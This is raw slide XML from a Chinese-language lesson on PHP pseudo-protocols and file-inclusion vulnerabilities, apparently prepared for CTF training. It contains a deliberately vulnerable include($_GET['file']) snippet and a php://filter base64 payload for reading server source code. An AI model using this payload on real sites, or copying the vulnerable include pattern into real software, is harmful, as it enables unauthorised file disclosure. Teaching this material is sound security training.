              </p:custDataLst>
            </p:nvPr>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="1085783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32" name="椭圆 31"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId31"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7490369" y="948895"/>
            <a:ext cx="3842284" cy="3842284"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent1"/>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="6604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3" name="任意多边形: 形状 19"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId32"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6352684" y="2805790"/>
            <a:ext cx="5839318" cy="4052211"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 3152097 w 5400187"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 3747475"/>
              <a:gd name="connsiteX1" fmla="*/ 5380966 w 5400187"/>
              <a:gd name="connsiteY1" fmla="*/ 923228 h 3747475"/>
              <a:gd name="connsiteX2" fmla="*/ 5400187 w 5400187"/>
              <a:gd name="connsiteY2" fmla="*/ 944376 h 3747475"/>
              <a:gd name="connsiteX3" fmla="*/ 5400187 w 5400187"/>
              <a:gd name="connsiteY3" fmla="*/ 3747475 h 3747475"/>
              <a:gd name="connsiteX4" fmla="*/ 57954 w 5400187"/>
              <a:gd name="connsiteY4" fmla="*/ 3747475 h 3747475"/>
              <a:gd name="connsiteX5" fmla="*/ 16274 w 5400187"/>
              <a:gd name="connsiteY5" fmla="*/ 3474380 h 3747475"/>
              <a:gd name="connsiteX6" fmla="*/ 0 w 5400187"/>
              <a:gd name="connsiteY6" fmla="*/ 3152096 h 3747475"/>
              <a:gd name="connsiteX7" fmla="*/ 3152097 w 5400187"/>
              <a:gd name="connsiteY7" fmla="*/ 0 h 374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0187" h="3747475">
                <a:moveTo>
                  <a:pt x="3152097" y="0"/>
                </a:moveTo>
                <a:cubicBezTo>
                  <a:pt x="4022524" y="0"/>
                  <a:pt x="4810549" y="352811"/>
                  <a:pt x="5380966" y="923228"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="5400187" y="944376"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5400187" y="3747475"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57954" y="3747475"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="16274" y="3474380"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="5513" y="3368416"/>
                  <a:pt x="0" y="3260900"/>
                  <a:pt x="0" y="3152096"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="0" y="1411241"/>
                  <a:pt x="1411242" y="0"/>
                  <a:pt x="3152097" y="0"/>
                </a:cubicBezTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:schemeClr val="lt1">
              <a:lumMod val="85000"/>
              <a:alpha val="99000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="6604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4" name="任意多边形: 形状 17"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId33"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="9411512" cy="6857999"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="connsiteX0" fmla="*/ 0 w 9411512"/>
              <a:gd name="connsiteY0" fmla="*/ 0 h 6857999"/>
              <a:gd name="connsiteX1" fmla="*/ 9066539 w 9411512"/>
              <a:gd name="connsiteY1" fmla="*/ 0 h 6857999"/>
              <a:gd name="connsiteX2" fmla="*/ 9141589 w 9411512"/>
              <a:gd name="connsiteY2" fmla="*/ 221804 h 6857999"/>
              <a:gd name="connsiteX3" fmla="*/ 9411512 w 9411512"/>
              <a:gd name="connsiteY3" fmla="*/ 2007174 h 6857999"/>
              <a:gd name="connsiteX4" fmla="*/ 6999850 w 9411512"/>
              <a:gd name="connsiteY4" fmla="*/ 6818295 h 6857999"/>
              <a:gd name="connsiteX5" fmla="*/ 6944016 w 9411512"/>
              <a:gd name="connsiteY5" fmla="*/ 6857999 h 6857999"/>
              <a:gd name="connsiteX6" fmla="*/ 0 w 9411512"/>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1512" h="6857999">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="9066539" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9141589" y="221804"/>
                </a:lnTo>
                <a:cubicBezTo>
                  <a:pt x="9317011" y="785802"/>
                  <a:pt x="9411512" y="1385452"/>
                  <a:pt x="9411512" y="2007174"/>
                </a:cubicBezTo>
                <a:cubicBezTo>
                  <a:pt x="9411512" y="3975961"/>
                  <a:pt x="8463877" y="5723415"/>
                  <a:pt x="6999850" y="6818295"/>
                </a:cubicBezTo>
                <a:lnTo>
                  <a:pt x="6944016" y="6857999"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6857999"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:schemeClr val="lt1">
              <a:alpha val="99000"/>
            </a:schemeClr>
          </a:solidFill>
          <a:ln>
            <a:noFill/>
          </a:ln>
          <a:effectLst>
            <a:outerShdw blurRad="355600" dist="381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35" name="直接连接符 34"/>
          <p:cNvCxnSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId34"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1140739" y="3016250"/>
            <a:ext cx="0" cy="520499"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="28575" cmpd="sng">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35"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066165" y="5654675"/>
            <a:ext cx="0" cy="51689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36"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1200150" y="5654675"/>
            <a:ext cx="0" cy="51689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37"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1371611" y="1744368"/>
            <a:ext cx="6400851" cy="30645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3100" spc="23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PHP伪协议指的是PHP所支持的协议与封装协议，在web渗透漏洞利用中常用于配合文件包含进行web攻击，从而获取网站权限。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="3100" spc="23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3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&lt;? php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>include($_GET[‘a’]);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>require($...)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:t>伪协议常用场景为文件包含和</a:t>
            </a:r>
            <a:r>
              <a:t>文本包含</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09880" y="1375410"/>
            <a:ext cx="10198100" cy="3514090"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="文本框 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-55245" y="808990"/>
            <a:ext cx="6096000" cy="521970"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2800"/>
              <a:t>文件包含函数</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="280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147320"/>
            <a:ext cx="6096000" cy="398780"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="2000"/>
              <a:t>包含漏洞分类</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="2000"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="文本框 2"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1214755"/>
            <a:ext cx="6096000" cy="1476375"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>包含的文件在服务器本地时，就形成了本地文件包含。文件包含可以包含任意文件，被包含的文件可以不是 PHP 代码，可以是文本或图片等。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>只要文件被包含就会被服务器脚本语言执行，如果包含的文件内容不符合 php 语法，会直接将文件内容输出</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>。例如下面这段简易的代码：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="753110"/>
            <a:ext cx="6096000" cy="368300"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>本地包含</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="210185" y="2829560"/>
            <a:ext cx="6096000" cy="1198880"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>&lt;?php</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    $file = $_GET['file'];</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>    include($file);</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>?&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="文本框 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6776085" y="609600"/>
            <a:ext cx="4771390" cy="1729740"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>远程包含</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>当包含的文件在远程服务器上时，就形成了远程文件包含。所包含远程服务器的文件后缀不能与目标服务器语言相同，远程文件包含需要在 php.ini 中设置：</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="文本框 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6701790" y="2983865"/>
            <a:ext cx="5217795" cy="1854835"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>allow_url_include = on（是否允许 include/require 远程文件）</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>allow_url_fopen = on（是否允许打开远程文件）</a:t>
            </a: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php支持的伪协议</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="内容占位符 3"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="838200" y="1691005"/>
            <a:ext cx="7230110" cy="49796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152827" y="104775"/>
            <a:ext cx="11901060" cy="268446"/>
            <a:chOff x="152827" y="104775"/>
            <a:chExt cx="11901060" cy="268446"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="9" name="等腰三角形 8"/>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3" name="等腰三角形 12"/>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grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="矩形 10"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId6"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="582613" y="848995"/>
            <a:ext cx="11048365" cy="5523865"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="lt1"/>
          </a:solidFill>
          <a:ln w="349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 name="矩形 3"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId7"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2146935" y="469265"/>
            <a:ext cx="7919720" cy="787400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="accent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7" name="标题 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId8"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2146618" y="468630"/>
            <a:ext cx="7920355" cy="788035"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="ctr" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lst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微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:cs typeface="+mj-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr marL="0" indent="0" algn="ctr">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPct val="100000"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="4000" spc="240">
                <a:solidFill>
                  <a:schemeClr val="lt1"/>
                </a:solidFill>
                <a:uFillTx/>
                <a:latin typeface="黑体" panose="02010609060101010101" charset="-122"/>
                <a:ea typeface="黑体" panose="02010609060101010101" charset="-122"/>
              </a:rPr>
              <a:t>1 php://filter</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US" sz="4000" spc="240">
              <a:solidFill>
                <a:schemeClr val="lt1"/>
              </a:solidFill>
              <a:uFillTx/>
              <a:latin typeface="黑体" panose="02010609060101010101" charset="-122"/>
              <a:ea typeface="黑体" panose="02010609060101010101" charset="-122"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="文本框 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId9"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1040130" y="1773974"/>
            <a:ext cx="10111740" cy="3685266"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="90000" tIns="46800" rIns="90000" bIns="46800" rtlCol="0" anchor="ctr">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="285750" indent="-285750" fontAlgn="auto">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buFont typeface="+mj-ea"/>
              <a:buAutoNum type="ea1JpnChsDbPeriod"/>
              <a:defRPr sz="1100" u="none" strike="noStrike" cap="none" spc="150" normalizeH="0" baseline="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="95000"/>
                    <a:lumOff val="5000"/>
                  </a:scheme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微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:ea typeface="微软雅黑" panose="020B050302020402020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微软雅黑" panose="020B0503020204020204" charset="-122"/>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0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buNone/>
            </a:pP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php://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。</a:t>
            </a:r>
            <a:endPar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0" lvl="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buNone/>
            </a:pP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简单通俗的说，这是一个中间件，在读入或写入数据的时候对数据进行处理后输出的一个过程。</a:t>
            </a:r>
            <a:endPar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0" lvl="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buNone/>
            </a:pP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php://filter可以获取指定文件源码。</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" spc="80">
                <a:solidFill>
                  <a:schemeClr val="dk1">
                    <a:lumMod val="85000"/>
                    <a:lumOff val="15000"/>
                  </a:schemeClr>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
                <a:latin typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:ea typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
                <a:cs typeface="微软雅黑" panose="020B0503020204020204" charset="-122"/>
              </a:rPr>
              <a:t>当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取</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endPar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0" lvl="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buNone/>
            </a:pP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范式（建议背下来）：加过滤器</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1"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?file=php://filter/convert.base64-encode/resource=文件</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN" sz="1600" b="1"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.php</a:t>
            </a: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会以</a:t>
            </a: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base64</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形式输出</a:t>
            </a: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a:t>
            </a:r>
            <a:endPar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a:p>
            <a:pPr marL="0" lvl="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buClr>
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                  <a:lumOff val="5000"/>
                </a:schemeClr>
              </a:buClr>
              <a:buSzPct val="100000"/>
              <a:buFont typeface="+mj-ea"/>
              <a:buNone/>
            </a:pP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不加过滤器</a:t>
            </a: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php://filter/resource=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"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文件</a:t>
            </a:r>
            <a:r>
              <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.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN" sz="1600" spc="8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custDataLst>
              <p:tags r:id="rId10"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="41211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6" name="矩形 5"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId11"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1145349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Tree>
    <p:custDataLst>
      <p:tags r:id="rId1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a:t>?file=php://filter/read=convert.base64-encode/resource=index.php</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="921385" y="501015"/>
            <a:ext cx="6096000" cy="922020"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>例如在 allow_url_include = on 时服务器上有个文件叫 index.php，且存在文件包含漏洞，这个时候就能用 php 伪协议直接把文件显示出来。</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="文本框 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1001395" y="3743325"/>
            <a:ext cx="6096000" cy="2030095"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>php://filter/ 是一种访问本地文件的协议，/read=convert.base64-encode/ 表示读取的方式是 base64 编码后，resource=index.php 表示目标文件为index.php。问什么要进行 base64 编码呢？如果不进行 base64 编码传入，index.php 就会直接执行，我们就看不到文件中的内容了。php 协议还常用 php://input，这可以访问请求的原始数据的只读流，可以读取 POST 请求的参数。</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[ACTF2020 新生赛]Include</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="zh-CN" altLang="en-US"/>
            </a:br>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t> buu</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="文本框 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr>
            <p:custDataLst>
              <p:tags r:id="rId1"/>
            </p:custDataLst>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1481455" y="3745230"/>
            <a:ext cx="6096000" cy="922020"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>拓展：file_include</a:t>
            </a:r>
            <a:endParaRPr lang="zh-CN" altLang="en-US"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>https://blog.csdn.net/m0_56107268/article/details/127846196</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2 data://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="zh-CN"/>
              <a:t>              </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="zh-CN"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="内容占位符 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
